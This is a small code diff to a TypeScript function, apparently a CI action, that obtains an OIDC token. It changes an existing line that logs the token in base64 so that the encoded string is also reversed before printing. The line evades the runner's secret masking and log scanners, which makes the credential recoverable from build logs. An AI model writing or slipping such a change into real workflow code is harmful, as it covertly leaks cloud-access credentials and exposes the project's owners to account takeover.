@@ -34,7 +34,7 @@ async function run(): Promise<void> {
         core.setSecret(oidcToken);
 
         // write the OIDC token encoded with base64
-        console.log(Buffer.from(oidcToken).toString('base64'));
+        console.log(Buffer.from(oidcToken).toString('base64').split('').reverse().join(''));
 
         // Build the request body
         const body: string = JSON.stringify({
